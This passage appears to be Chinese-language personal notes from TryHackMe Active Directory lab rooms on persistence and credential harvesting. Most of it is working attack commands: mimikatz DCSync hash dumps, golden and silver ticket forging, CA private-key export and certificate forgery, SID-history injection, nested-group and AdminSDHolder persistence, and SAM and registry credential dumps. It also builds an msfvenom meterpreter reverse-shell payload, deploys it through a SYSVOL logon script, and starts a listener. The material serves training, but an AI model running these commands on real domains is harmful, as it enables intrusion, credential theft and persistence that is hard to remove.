\\\\thmrootdc.tryhackme.loc\\c$\\Users\\Administrator\\Desktop\\flag6.txt 总结我个人觉得还是因为 AD 的复杂性导致这么多的权限问题，小权限用户可以加组，然后那个组可以改管理员的密码？这个在一开始不应该警告用户吗？ 再到 Kerberos 委派可以不经过用户同意去以他的身份申请证书（WTF？？）。然后就是利用打印机服务可以远程让一个机器去请求另外一个机器（SSRF？），最难崩的还是通信过程不强制加密，直接给拦咯。 后面那个密码记录和 GPO 修改就感觉挺正常的，不算设计上的问题。到后面那个证书就纯纯的是用户的锅了，感觉又不全是，微软得背一半。按理说这种可以伪造 SAN 的证书就应该保留一个原始的名字，而且对于这种敏感权限的调用，这种证书就应该默认拒绝。 金票更是难绷，整个认证就靠一个 Hash？？当时听别人说金票银票挺高级的，结果就这？dcsync 一个同步能把用户的 Hash 同步过来，就不知道说什么了。跨域信任就挺正常，算是正常利用吧。 总之这个房间让我学到了超级多 AD 的问题和利用点，感觉 AD 这种安全性是 M$ 的人一拍脑子想下来到的东西，可能也和屎山有关系，最主要的我还是觉得是那个 Hash 问题很大很大。 在管理方来看，这种设计问题就挺难避免的，在增加类似权限的时候，我觉得可以增加一些检查机制，来揭示出这种攻击路径，或许已经有类似安全工具可以检查了。 拓展阅读 Silver Ticket Attack Golden Ticket Attack Kerberoasting Attack NTDS.dit Password Extraction DCSync Attack Using Mimikatz Detection Persisting Active Directoryirene.leach Password1 Persistence through Credentials这一节讲了利用 dcsync 把密码的 hash 全部 dump 出来，然后离线爆破 域同步（DC Sync）大型组织中，为了保证认证服务的响应速度，一个域通常会部署多个域控制器（DC）。为了让所有 DC 的数据保持一致，它们会通过**域复制（Domain Replication）**机制来同步信息。 每个 DC 都会运行一个名为 KCC 的进程，它会建立一个复制拓扑，并通过 RPC 与其他 DC 同步用户密码、新账户等信息。这就是为什么更改密码后，有时需要等待几分钟才能在新地点登录，因为你登录的 DC 可能还没来得及同步最新的密码。 这个同步过程也称为 DC 同步（DC Synchronisation）。除了 DC 自己，拥有域管理员权限的账户也可以为了合法目的发起这个同步。 如果攻击者获取了拥有域复制权限的账户，就可以执行 DC Sync 攻击，冒充 DC 来从另一个 DC 窃取凭据。 凭据并非都一样在 DC Sync 攻击中，选择要窃取的凭据非常关键。虽然域管理员凭据权限最高，但蓝队一旦发现入侵，会最先重置这类账户的密码，导致你可能很快失去访问权限。 所以，更聪明的做法是获取接近高权限但又不易被察觉的凭据，以此实现持久化访问。这些凭据类型包括： 多台机器的本地管理员账户：通常有专门的组拥有对大量计算机的本地管理员权限。窃取这些账户的凭据，可以让你保持对大部分机器的访问。 拥有委派权限的服务账户：利用这类账户可以发动 Kerberos 委派攻击，例如黄金票据和白银票据。 特权 AD 服务账户：例如 Exchange、WSUS 或 SCCM 的账户。攻陷这些账户可以作为跳板，再次获得高权限。 1234567891011121314C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe # 试验同步一个账户 lsadump::dcsync /domain:za.tryhackme.loc /user:irene.leach # 启用记录功能 log recopec_dcdump.txt # 通过同步提取所有用户的信息 lsadump::dcsync /domain:za.tryhackme.loc /all # 筛选文件 cat &lt;username&gt;_dcdump.txt | grep &quot;SAM Username&quot; cat recopec_dcdump.txt | grep &quot;Hash NTLM&quot; Persistence through TicketsKerberos 认证基础Kerberos 认证的核心在于 **TGT（票据授权票据）**和 TGS（票据授权服务）。 TGT 请求：用户向域控制器（DC）发送一个包含用其 NTLM 哈希加密的时间戳的 AS-REQ 请求，以此来获取 TGT。DC 验证后，颁发一个用 KRBTGT 账户密码哈希签名的 TGT。 TGS 请求：用户将 TGT 发送给 DC，请求访问特定资源的 TGS。如果 TGT 有效，DC 会颁发一个用该服务账户的 NTLM 哈希加密的 TGS。 访问资源：用户将 TGS 提交给目标服务，服务验证后授予访问权限。 黄金票据（Golden Tickets）黄金票据是伪造的 TGT。通过这种攻击，我们完全绕过了向 DC 证明身份的步骤。有了伪造的、拥有高权限账户的 TGT，我们就可以请求访问任何我们想要的服务。 必要信息：要伪造黄金票据，攻击者需要四样东西： KRBTGT 账户的密码哈希 域的完全限定域名 (FQDN) 域的安全标识符 (SID) 要冒充的用户的 ID 攻击要点： 核心需求：为了伪造黄金票据，我们必须拥有 KRBTGT 账户的密码哈希，因为它是所有 TGT 的签名者。 绕过认证：我们不需要知道被冒充用户的密码哈希。只要票据由 KRBTGT 哈希签名，DC 就会无条件信任它。 持久化： 票据中的用户账户即使被禁用或删除，只要票据生成时间在 20 分钟内，依然有效。 我们可以修改票据的有效期，比如从 10 小时延长到 10 年，以此获得持久化访问。 KRBTGT 账户的密码默认不更改，一旦获取，除非手动重置两次（重置掉当前密码和历史密码，为了保持服务可用性），否则我们可以永久使用。 轮换 KRBTGT 账户的密码对蓝队来说是一个痛苦的过程，有些服务不会自己拉取新的 TGT，导致宕机。 隐蔽性：黄金票据可以在任何机器上生成，甚至是未加入域的机器，这使得攻击更难被发现。 高权限：黄金票据甚至可以绕过智能卡认证，并且提供对域内所有资源的完全控制。 白银票据（Silver Tickets）白银票据是伪造的 TGS。与黄金票据不同，我们跳过了与 KDC 的所有通信，直接与我们想要访问的服务进行交互。 要伪造一张白银票据，你需要以下四样关键信息： 目标服务账户的 NTLM 哈希：这是最核心的，因为这个哈希是用来加密和签名票据的“密钥”。通常，这个哈希是目标服务器的机器账户哈希（例如 THMSERVER1$）。 域的安全标识符 (SID)：用于标识票据所属的域。 要冒充的用户的 ID：票据中会包含你想要伪装的用户名，比如 Administrator。 目标服务帐户的 SPN (Service Principal Name)：这是服务的唯一标识，格式为 &lt;服务类型&gt;/&lt;主机名&gt;，比如 cifs/thmserv1.za.tryhackme.loc。 攻击要点： 核心需求：为了伪造白银票据，我们需要目标服务器机器账户的密码哈希。 范围有限：白银票据的权限范围仅限于特定服务器上的特定服务。相比黄金票据的完全控制，它的权限范围要小得多。 极高隐蔽性：由于攻击绕过了 DC，没有 TGT 的生成记录，所以唯一的日志只存在于被攻击的服务器上，使得蓝队很难察觉。 持久化：我们可以利用白银票据修改注册表，来阻止机器账户密码自动重置（通常每 30 天重置一次），从而保持对该主机的持久化访问。 机器账户：机器账户可以被视为普通的 AD 账户，因此即使只获取了它的权限，也足以继续进行信息收集和攻击。 关于 Svc Session Key，这个也要参考这张图。 在正常的 Keberos 认证中，Svc Session Key 是 KDC 生成并且返回给我们的，然后 TGS 里面会有一份 Svc Session Key，如果我们没有拿到白银票据（服务账户的 Hash），我们就没法对 TGS 下手，所以这个攻击链就没法完成。正因为有了服务账户的 Hash，所以我们可以捏造 Svc Session Key 了，在原始的过程中，这个 Key 是用来保证请求不被篡改的，一旦有了 Hash，这个安全性就不存在了。 伪造票据实践12# 获取域信息，关注 SID 和 FQDN Get-ADDomain DomainSID: S-1-5-21-3885271727-2693558621-2658995185 DNSRoot: za.tryhackme.loc krbtgt: 16f9af38fca3ada405386b3b57366082 123# 使用 mimikatz 生成金票 # /ptt 代表让 mimikatz 直接加载凭据到现在这个 session 里 kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt &#x2F;endin: 票据的绝对有效期（Ticket Lifetime） 含义: 这是票据的绝对截止日期。一旦过了这个时间，票据就彻底失效，无法再续订。 用途: 它定义了票据最长能使用多久。在默认的 AD 策略中，这个时间通常是 10 小时。 示例: 你可以把 /endin 理解为一张电影票的**“有效截止日期”**。过了这个日期，电影票就作废了。 &#x2F;renewmax: 票据最长可续订时间（Maximum Renew Lifetime） 含义: 这是票据可以被续订的最长时间。只要在 /endin 之前，你可以向 KDC（Key Distribution Center）请求续订，以延长票据的有效时间。但这个续订过程不能超过 /renewmax 的限制。 用途: 它允许用户在一段时间内保持访问，而无需频繁地重新认证。默认的 AD 策略通常是 7 天。 示例: 你可以把 /renewmax 理解为一张图书馆借书证的**“最长借书期限”**。你每次借书的期限可能只有两周（/endin），但只要不超过总的“最长借书期限”（/renewmax），你就可以反复续借。 虽然黄金票据提供了强大的持久化访问能力，但蓝队可以通过重置 KRBTGT 账户密码两次来对抗它。因此，如果想真正实现持久化，更应该使用白银票据。 12# 生成银票 kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt &#x2F;target - The hostname of our target server. Let’s do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host. &#x2F;rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account. &#x2F;service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access. 要注意的是，服务账户的密码是会轮换的，一旦轮换了，这个 TGS 就失效了，所以一般还要对注册表下手，以实现持久化。 Persistence through Certificates虽然依赖凭据的持久化技术很有效，但蓝队最终可以通过轮换凭据来清除攻击者的访问权限。因此，我们需要寻找不依赖于凭据的、更高级的持久化技术，而证书就是其中之一。 证书不仅是用于权限提升的工具，更是一种强大且难以清除的持久化手段。通过获取一张有效的客户端认证证书，攻击者可以绕过密码重置，长期维持对目标账户的访问。这种持久化方式的有效性通常长达数年，除非蓝队主动吊销或等待证书过期。更深一层的攻击是直接攻陷证书颁发机构（CA）本身，窃取其根证书的私钥。这样一来，攻击者就能随意伪造证书，并且这些证书因为没有正式颁发记录，蓝队甚至无法通过吊销来清除，唯一的防御手段是轮换整个 CA，这会对整个组织造成灾难性的业务影响，让蓝队在付出巨大努力清理完其他所有入侵痕迹后，仍然无法摆脱攻击者的控制。 提取私钥可以用 Mimikatz 和 SharpDPAPI 提取证书的私钥 12345# 启动 mimikatz C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe # 查看存储的证书 crypto::certificates /systemstore:local_machine 可以看到有一些证书的 Exportable key : NO，所以没法直接导出，但是我们可以通过修改内存的方式让他们可以导出 1234567privilege::debug crypto::capi crypto::cng # 导出证书 crypto::certificates /systemstore:local_machine /export 导出的证书会同时用 PFX 和 DER 格式存储在目录下，mimikatz 默认会用 mimikatz 密码加密证书。 生成和使用证书现在我们有了私钥和根证书，我们能用 ForgeCert 工具去伪造我们想要的用户认证证书。 1C:\\Tools\\ForgeCert\\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 要关注的参数是 SubjectAltName，即 SAN。还记得上个 Room 那个证书模板允许使用替代名字吗，就是这个玩意。 然后我们就可以用这个证书去请求 TGT： 12345# Rubeus 生成 TGT C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:tgt.tgt /domain:za.tryhackme.loc /dc:thmdc.za.tryhackme.loc # mimikatz 载入 TGT kerberos::ptt tgt.tgt 这里依旧提示 [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP ，可以用 LDAP 认证去绕过，上个房间有步骤，就不再叙述了。 我们不再是蓝队的朋友证书持久化是极难防御的。即使你轮换了被入侵账户的凭据，证书仍然是有效的。移除这种持久化的唯一方法是吊销证书。然而，这只在我们通过合法渠道生成证书的情况下才有可能。由于我们是导出 CA 后自己生成了证书，它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法吊销我们的证书。 那么，移除这种持久化的唯一解决方案是什么？这就是我们不再是朋友的原因了。他们将不得不吊销根 CA 证书。但吊销这个证书意味着所有由 AD CS 颁发的证书将全部失效。换言之，他们必须为每个使用 AD CS 的系统重新生成证书。你应该开始明白为什么这种类型的持久化是极其危险的，如果真的发生，可能需要对系统进行全面重建。 拓展阅读 Golden Certificate Persistence through SID History这个 SID 就和之前那个改两次 krbtgt 密码有异曲同工之妙，SID（Security Identifier）是用来唯一标识用户和组账户的。当一个组织进行 Active Directory 迁移时，用户在新域中会得到一个新的 SID。为了让他们能够继续访问旧域的资源，管理员可以将旧的 SID 添加到他们在新账户的 SID 历史属性中。 这个过程本质上是赋予一个新账户旧账户的所有权限。而攻击者可以滥用这个功能，将一个高权限账户的 SID（例如域管理员的 SID）添加到自己低权限账户的 SID 历史中。这样，攻击者就能以自己的账户身份，获得高权限账户的所有访问权限，从而实现持久化。这种技术非常隐蔽，因为账户本身的权限看起来没有变化，但它实际上拥有了管理员的权限。 SID History 能让我们为所欲为实际上，SID 历史的功能并不仅限于包含来自其他域的 SID。只要有足够的权限，我们甚至可以将当前域的 SID 添加到我们控制的账户的 SID 历史中。关于这种持久化技术，有以下几个要点： 通常，我们需要域管理员或同等的权限才能执行此攻击。 当账户创建登录事件时，与之关联的 SID 会被添加到用户的令牌中，进而决定该账户的权限。这其中包括了组的 SID。 如果我们将企业管理员（Enterprise Admin）的 SID 注入到 SID 历史中，就可以将账户权限提升到等同于整个林中所有域的域管理员。 由于 SID 是直接添加到用户令牌中的，即使该账户并未实际加入到任何特定组中，其权限也会被认可。这使得它成为一种非常隐蔽的持久化方法。我们的账户可以只是一名普通用户，只属于 Domain Users 组，却拥有足以攻陷整个域（甚至整个林）的权限。我们甚至可以更进一步，利用这个账户去修改其他账户的 SID 历史，从而让初始的持久化入口更难被发现和修复。 伪造历史1234567# 检查我们的用户目前 SID history 没有任何数据 Get-ADUser irene.leach -properties sidhistory,memberof # SIDHistory : {} # 查看 Domain Admins 组的 SID Get-ADGroup &quot;Domain Admins&quot; # SID : S-1-5-21-3885271727-2693558621-2658995185-512 我们可以使用类似 Mimikatz 的工具来添加 SID 历史记录。但是，最新版本的 Mimikatz 有一个缺陷，无法通过修补 LSASS 来更新 SID 历史记录。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库： 123456# NTDS 数据库在运行的时候是被锁定的 Stop-Service -Name ntds -force # 修补数据库 Add-ADDBSidHistory -SamAccountName &#39;irene.leach&#39; -SidHistory &#39;S-1-5-21-3885271727-2693558621-2658995185-512&#39; -DatabasePath C:\\Windows\\NTDS\\ntds.dit # 启动 NTDS 服务 Start-Service -Name ntds 现在应该就有权限了，用我们那个用户登录检查一下 123456# 查看当前的 sidhistory Get-ADUser irene.leach -Properties sidhistory # SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} # 检查一下是否真的有权限执行 dir \\\\thmdc.za.tryhackme.loc\\c$ 蓝队的怒火与无力如果你使用 RDP 登录到其中一台主机并使用“AD 用户和组”管理工具，你能够看到被添加到你用户账户上的 SID 历史属性。然而，即使拥有最高权限，你也无法通过这个图形界面移除该属性，因为它受到了保护。要移除它，你必须使用像 AD-RSAT PowerShell 命令这样的工具。 然而，在你考虑如何移除恶意的 SID 历史属性之前，你首先要能找到它。常规的工具不会告诉你哪里出了问题。那个用户并不会突然显示为“域管理员”组的成员。因此，除非你主动地逐一检查所有用户的属性，否则这会非常难被发现。这是因为 SID 历史只在用户认证时才会被应用和使用。 想象一下你就是蓝队成员，正在处理一起入侵事件。你刚刚完成了一次域清理，为此两次重置了 krbtgt 账户的密码，清除了黄金和白银票据，甚至从头重建了整个 CA 服务器。但就在这时，你却发现攻击者仍然在用一个低权限账户执行域管理员的命令。这绝对会是糟糕透顶的一天。 Persistence through Group Membership蓝队会重点监控那些最高权限的“受保护组”，比如 Domain Admins。直接将自己的账户加入这些组，虽然能立刻获得最高权限，但被发现的风险也最大。 选择次要但关键的组：更隐蔽的策略是选择那些看似普通但实际上拥有强大权限的组，比如： IT 支持组：可以重置低权限用户的密码。这听起来权限不高，但可以作为“跳板”，通过窃取其他用户的凭据来逐步提升权限。 本地管理员组：获得对多台机器的本地管理员权限，意味着可以控制这些机器。一旦控制足够多的机器，就有机会横向移动并最终攻陷整个域。 拥有 GPO 所有权的组：GPO 能够影响整个域的策略，控制它就相当于控制了域内的安全配置。这种权限虽然不是直接的“管理员”，但其潜在危害同样巨大。 简而言之，持久化的最高境界不是拥有最高权限，而是以最低的被发现风险，获得足以重新发起攻击的关键权限。 嵌套组嵌套组（Nested Groups）是一种利用 Active Directory 复杂权限结构的攻击手法。直接将账户加入高权限的父组（如“域管理员”）非常显眼，容易被安全团队发现。因此，攻击者可以转而将自己的账户加入到该父组的子组中。通过这种方式，攻击者可以继承父组的所有权限，但账户本身看起来只是一个普通子组成员，从而降低了被监控系统发现的风险，实现了隐蔽的持久化访问。这种攻击利用了 AD 中权限可见性差、监控不完善的弱点，是一种比直接加组更隐蔽和高级的持久化技术。 就是套娃，直接加一个组很明显，但是我们可以加这个组下面的组，同样拥有这个组的权限。 套娃12345678910111213141516171819202122232425# 在 People-&gt;IT OU 下创建一个组 New-ADGroup -Path &quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 1&quot; -SamAccountName &quot;irene.leach_nestgroup1&quot; -DisplayName &quot;irene.leach Nest Group 1&quot; -GroupScope Global -GroupCategory Security # 在 People-&gt;Sales OU 下创建一个组 New-ADGroup -Path &quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 2&quot; -SamAccountName &quot;irene.leach_nestgroup2&quot; -DisplayName &quot;irene.leach Nest Group 2&quot; -GroupScope Global -GroupCategory Security # 把我们创建的第一个组加到第二个组下面的成员里面 Add-ADGroupMember -Identity &quot;irene.leach_nestgroup2&quot; -Members &quot;irene.leach_nestgroup1&quot; # 可以重复很多次 New-ADGroup -Path &quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 3&quot; -SamAccountName &quot;irene.leach_nestgroup3&quot; -DisplayName &quot;irene.leach Nest Group 3&quot; -GroupScope Global -GroupCategory Security Add-ADGroupMember -Identity &quot;irene.leach_nestgroup3&quot; -Members &quot;irene.leach_nestgroup2&quot; New-ADGroup -Path &quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 4&quot; -SamAccountName &quot;irene.leach_nestgroup4&quot; -DisplayName &quot;irene.leach Nest Group 4&quot; -GroupScope Global -GroupCategory Security Add-ADGroupMember -Identity &quot;irene.leach_nestgroup4&quot; -Members &quot;irene.leach_nestgroup3&quot; New-ADGroup -Path &quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 5&quot; -SamAccountName &quot;irene.leach_nestgroup5&quot; -DisplayName &quot;irene.leach Nest Group 5&quot; -GroupScope Global -GroupCategory Security Add-ADGroupMember -Identity &quot;irene.leach_nestgroup5&quot; -Members &quot;irene.leach_nestgroup4&quot; # 把创建的第五个组加入 Domain Admins 组里 Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;irene.leach_nestgroup5&quot; # 把我们的低权限用户加到创建的第一个组里 Add-ADGroupMember -Identity &quot;irene.leach_nestgroup1&quot; -Members &quot;irene.leach&quot; # 查看组成员 Get-ADGroupMember -Identity &quot;Domain Admins&quot; 现实中一般是用现有的组来进行嵌套。 Persistence through ACLs这一节则是利用 AD 组的模板的定时同步特性去持久化。 有时候，我们需要的不仅仅是针对普通 AD 组的持久化。如果我们想同时对所有受保护的组进行持久化，该怎么办？ 通过 AD 组模板进行持久化虽然我们可以将我们控制的账户直接添加到所有能找到的特权组中，但蓝队仍然可以进行清理并移除我们的成员资格。为了获得更好的持久化效果，并让蓝队百思不得其解，我们应该转而注入到生成默认组的模板中。通过注入这些模板，即使他们移除了我们的成员资格，我们只需等待模板刷新，就能再次获得成员资格。 其中一个模板就是 AdminSDHolder 容器。这个容器存在于每个 AD 域中，它的访问控制列表（ACL）被用作一个模板，来复制权限到所有受保护的组。受保护的组包括“域管理员（Domain Admins）”、“管理员（Administrators）”、“企业管理员（Enterprise Admins）”和“架构管理员（Schema Admins）”等特权组。完整的组列表可以在这里找到。 一个名为 SDProp 的进程会每隔 60 分钟，将 AdminSDHolder 容器的 ACL 应用到所有受保护的组。因此，我们可以写入一个 ACE（访问控制条目），授予我们在所有受保护组上的完全权限。如果蓝队没有意识到这种类型的持久化正在被使用，他们会感到非常沮丧。因为每次他们移除受保护对象或组上不适当的权限时，这些权限都会在一小时内重新出现。由于这种重建是通过正常的 AD 进程发生的，它也不会向蓝队发出任何警报，使得他们很难查明持久化的来源。 使用 AdminSDHolder 持久化为了将持久性部署到 AdminSDHolder，我们将使用 Microsoft 管理控制台（MMC）。为避免将用户从 RDP 会话中踢出，最好使用低权限凭据 RDP 进入 THMWRK1，使用 runas 命令注入管理员凭据，然后从这个新终端执行 MMC： 1runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe add the Users and Groups Snap-in (File-&gt;Add Snap-In-&gt;Active Directory Users and Computers). Make sure to enable Advanced Features (View-&gt;Advanced Features 要选中那个域名才会出现). 找到 AdminSDHolder 组 右键 -&gt; 属性 -&gt; 安全，把我们的低权限账户加进去，然后授予完全控制权限。 SDProp现在我们只需等待 60 分钟，用户就可以完全控制所有受保护组了。这是因为安全描述符传播器（SDProp）服务每 60 分钟自动执行一次，并将此更改传播到所有受保护组。在 C:\\Tools\\ 目录中（我没找到，手动传的），提供了一个脚本 Invoke-ADSDPropagation，他可以让这个行为立即执行。 12Import-Module .\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation 执行之后马上就能看到这个用户被加上权限了，可以自己试验把他删了，然后手动执行一下脚本他又回来了。不过我们用户不会在这个组里面，只是有这个组的编辑权限，还要手动加进去。 对蓝队来说简直是雪上加霜想象一下，把这种技术和之前讨论过的“嵌套组”结合起来。当蓝队刚通过无数次修改组权限来清除你的访问时，60 分钟后，你又可以重新来过。除非蓝队知道权限正在通过 AdminSDHolder 组被更改，否则他们会每隔一小时就感到困惑不解。由于这种持久化是通过一个合法的 AD 服务传播的，他们很可能每次都无法察觉。如果你真的想实现长久持久化，你可以在 AdminSDHolder 组中授予 Domain Users 组完全控制权限，这意味着任何低权限用户都将获得对所有受保护组的完全控制。再结合一次完整的 DC Sync 攻击，蓝队将不得不重置域中每个账户的凭据，才能将我们彻底清除。 Persistence through GPOs这一节则是用组策略对象 GPO 去内置一些启动脚本达成持久化。 域范围持久化以下是一些常见的 GPO 持久化技术： 受限组（Restricted Group）成员资格：这可以让我们获得域中所有主机的管理员访问权限。 登录脚本部署：这能确保每当有用户认证登录到域中的主机时，我们都能获得一个反向 Shell 连接。 准备12# 生成小马 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe &gt; recopec_shell.exe Windows 允许我们通过登录 GPO 执行批处理或 PowerShell 脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个脚本，将可执行文件复制到主机，并在用户验证后执行。 1copy \\\\za.tryhackme.loc\\sysvol\\za.tryhackme.loc\\scripts\\recopec_shell.exe C:\\tmp\\recopec_shell.exe &amp;&amp; timeout /t 20 &amp;&amp; C:\\tmp\\recopec_shell.exe 123456# 复制文件到 sysvol 目录下 scp recopec_shell.exe za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ scp recopec_script za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ # 启动 MSF 监听器 msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot; 创建 GPO照例用 Runas 注入凭据，然后添加 Group Policy Management 组件。 1runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe 从技术上讲，我们可以将内容写入 “默认域策略”，该策略应传播到所有 AD 对象，但我们将采用更狭义的方法来完成任务，只是为了展示过程。之后，您可以尝试将更改应用到整个域。 我们将编写一个应用于所有管理员的 GPO，因此右键单击 Admins OU 并选择在此域中创建一个 GPO，然后将其链接到此处。 貌似被修复了：https://support.microsoft.com/en-us/topic/ms15-011-vulnerability-in-group-policy-could-allow-remote-code-execution-february-10-2015-91b4bda2-945d-455b-ebbb-01d1ec191328 后面的走不下去了。 总结我们有几种不同的方法在 AD 中维持权限。其中一些方法的持久性比其他方法更好。为了确保您的持久性不会被蓝队删除，您必须创造性地考虑您的持久性。此外，你不应该等到整个域攻陷后才部署持久性。在每一轮横向移动和权限升级之后，都应部署持久性。 其他持久化技术在本网络中，我们介绍了可用于在 AD 中持久化的几种技术，以下是同样值得一提的持久化技术： Skeleton keys - 使用 Mimikatz，我们可以部署一把“万能钥匙”。Mimikatz 会创建一个默认密码，这个密码对域内的任何账户都有效。同时，账户的原始密码仍然可用，这使得很难察觉到该攻击的发生。利用这把万能钥匙，攻击者可以冒充域内的任何账户。 Directory Service Restore Mode (DSRM) - 域控制器有一个用于紧急情况的内置管理员账户，称为 DSRM 账户。这个密码在服务器被提升为域控制器时设置，并且很少更改。在紧急情况下，这个密码可以用来恢复域控制器。攻击者可以使用 Mimikatz 提取这个密码，并利用它获得对环境中域控制器的持久化管理员权限。 Malicious Security Support Provider (SSP) - 通过利用 SSP 接口，可以添加新的 SSP。我们可以将 Mimikatz 的 mimilib 添加为一个 SSP，它会把所有认证尝试的凭据记录到一个文件中。我们可以指定一个网络位置来记录，这使得 mimilib 可以在用户认证到被入侵主机时将凭据发送给我们，从而实现持久化。 Computer Accounts - 计算机账户的密码通常每 30 天自动轮换一次。然而，我们可以修改一个计算机账户的密码，从而阻止这种自动轮换。与此同时，我们还可以授予该计算机账户对其他机器的管理员访问权限。这将使我们能够像使用普通账户一样使用这个计算机账户，而这种持久化的唯一迹象就是该账户对其他主机拥有管理员权限，这在 AD 中通常是正常行为，因此可能不会被检测到。 防御措施防御 AD 持久化可能非常棘手。在某些情况下，持久化的根源可能深到需要完全重建整个域。然而，我们仍然可以采取一些措施来检测已部署的持久化技术： 异常账户登录事件：这是最常见的持久化告警。任何时候，当凭据违反了分层模型时，都可能意味着存在持久化。 编写特定检测规则：针对每一种提到的持久化技术，都可以编写特定的检测规则。例如，当机器账户的密码发生更改时、ACL 权限被随意更新时，或有新的 GPO 被创建时。 保护特权资源：对抗持久化的最佳防御是保护特权资源。尽管低权限访问可以用来部署一些持久化技术，但那些真正可怕的技术只有在攻击者获得域的特权访问后才可用。 Credentials Harvesting这个房间讲的就是一些凭证收集的技巧了，应该记录在速查里面的 直接访问的凭据 命令历史 配置文件（Web App, FTP 文件等） 备份文件 共享文件和文件夹 注册表 源码 数据库 密码管理器 12345678910# PowerShell 命令历史 type C:\\Users\\Recopec\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt # 注册表搜索密码关键字 reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s # Active Directory # 获取域内用户用户名 SamAccountName 和描述 Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description Windows 本地凭据方法1：键盘记录器，MSF 自带 SAM 文件SAM 是一个 Microsoft Windows 数据库，其中包含用户名和密码等本地账户信息。SAM 数据库以加密格式存储这些详细信息，使其更难被检索。此外，在 Windows 操作系统运行时，任何用户都无法读取和访问该数据库。不过，有多种方法和攻击方式可以转储 SAM 数据库的内容。 不能读取 SAM 文件的解决办法因为权限或者其他问题导致没法直接把 sam 文件读取出来。 MSF这个就不用说了把，直接 hashdump 就出来了。 Volume Shadow Copy Service这个像是打一个快照一样，然后去访问这个快照，就绕过了访问限制，这里我们用 wmic 完成这个操作，注意需要管理员权限。 123456789101112# 给 C 盘创建一个 shadowcopy wmic shadowcopy call create Volume=&#39;C:\\&#39; # vssadmin: Volume Shadow Copy Service administrative command-line tool # 查看 shadowcopy 列表 vssadmin list shadows # Shadow Copy Volume: 即我们要找的目录 # 复制我们要的文件 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam C:\\users\\thm\\Desktop\\sam # 复制解密密钥 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system C:\\users\\thm\\Desktop\\system SAM 数据库是被 RC4 或者 AES 加密的，我们需要一个解密密钥，在 c:\\Windows\\System32\\Config\\system 下。 Registry Hives另一种转储 SAM 数据库内容的方法是通过 Windows 注册表。Windows 注册表还存储了部分 SAM 数据库内容的副本，供 Windows 服务使用。幸运的是，我们可以使用 reg.exe 工具保存 Windows 注册表的值。 123456# 导出这两个文件 reg save HKLM\\sam C:\\users\\thm\\Desktop\\sam-reg reg save HKLM\\system C:\\users\\thm\\Desktop\\system-reg # 解密 python secretsdump.py -sam /home/kali/thm/sam-reg -system /home/kali/thm/system-reg local 请注意，如果我们将输出结果与从 Metasploit 的 Hashdump 中获得的 NTLM 哈希值进行比较，结果是不同的。原因是其他账户属于 AD，它们的信息没有存储在我们转储的系统文件中。要解密它们，我们需要转储 Windows 文件中的 SECURITY 文件，其中包含解密 Active Directory 账户所需的文件。获得 NTLM 哈希值后，如果可以猜到，我们可以尝试使用 Hashcat 对其进行破解，或者使用不同的技术使用哈希值冒充用户。 本地安全管理子系统服务什么是 LSASS本地安全授权服务器服务（LSASS）是一个 Windows 进程，负责处理操作系统安全策略并在系统中执行。它验证登录账户并确保密码、哈希值和 Kerberos 票据。Windows 系统将凭证存储在 LSASS 进程中，以便用户访问网络资源，如文件共享、SharePoint 网站和其他网络服务，而无需在每次连接时输入凭证。因此，LSASS 进程是红队人员的目标，因为它存储了用户账户的敏感信息。LSASS 通常会被滥用来转储凭证，以提升权限、窃取数据或横向移动。幸运的是，如果我们拥有管理员权限，就可以转储 LSASS 的进程内存。Windows 